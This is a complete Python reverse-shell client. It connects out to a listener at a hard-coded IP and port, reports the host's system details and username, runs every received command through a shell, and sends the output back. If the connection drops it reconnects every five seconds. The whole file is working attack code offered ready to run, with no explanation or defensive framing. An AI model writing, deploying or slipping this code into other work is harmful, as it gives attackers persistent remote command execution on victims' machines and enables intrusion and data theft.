#!/usr/bin/env python3
import socket
import subprocess
import sys
import os
import platform
import time

def connect_to_server(host='192.168.1.110', port=9001):
    """
    Connect to reverse shell server at 192.168.1.110:9001
    """
    while True:
        try:
            print(f"[*] Trying to connect to {host}:{port}...")
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(10)
            client.connect((host, port))
            print(f"[+] Connected to {host}:{port}")
            client.settimeout(None)
            
            # Send initial info
            system_info = f"{platform.system()} {platform.release()}"
            client.send(f"[+] Connected from: {platform.node()}\n".encode())
            client.send(f"[+] System: {system_info}\n".encode())
            client.send(f"[+] User: {os.getlogin()}\n\n".encode())
            
            while True:
                try:
                    # Receive command
                    command = client.recv(4096).decode(errors='ignore').strip()
                    
                    if not command:
                        break
                    
                    if command.lower() == 'exit' or command.lower() == 'quit':
                        client.send(b'[!] Connection terminated by server\n')
                        break
                    
                    # Execute command
                    try:
                        # Determine shell based on OS
                        if platform.system().lower() == 'windows':
                            shell = True
                            args = command
                        else:
                            shell = True
                            args = command
                        
                        # Execute with timeout
                        process = subprocess.run(
                            args,
                            shell=True,
                            capture_output=True,
                            text=True,
                            timeout=30
                        )
                        
                        # Send output
                        if process.stdout:
                            client.send(process.stdout.encode())
                        if process.stderr:
                            client.send(f"[stderr]\n{process.stderr}".encode())
                        
                        # Send prompt
                        client.send(f"\n[{os.getcwd()}] $ ".encode())
                        
                    except subprocess.TimeoutExpired:
                        client.send(b"\n[!] Command timed out after 30 seconds\n")
                    except Exception as e:
                        client.send(f"\n[!] Error: {str(e)}\n".encode())
                        
                except socket.timeout:
                    client.send(b"\n[!] Socket timeout\n")
                    break
                except Exception as e:
                    client.send(f"\n[!] Connection error: {str(e)}\n".encode())
                    break
                    
        except ConnectionRefusedError:
            print(f"[!] Connection refused. Is the server running on {host}:{port}?")
        except socket.timeout:
            print("[!] Connection timeout")
        except Exception as e:
            print(f"[!] Error: {str(e)}")
        
        # Try to reconnect after delay
        print("[*] Attempting to reconnect in 5 seconds...")
        time.sleep(5)
        continue

if __name__ == "__main__":
    print("="*50)
    print("REVERSE SHELL CLIENT")
    print("="*50)
    
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
    elif len(sys.argv) == 2:
        host = sys.argv[1]
        port = 9001
    else:
        # Default to your WiFi IP
        host = '192.168.1.110'
        port = 9001
    
    print(f"[*] Target: {host}:{port}")
    print("[*] Press Ctrl+C to exit\n")
    
    try:
        connect_to_server(host, port)
    except KeyboardInterrupt:
        print("\n[!] Client stopped by user")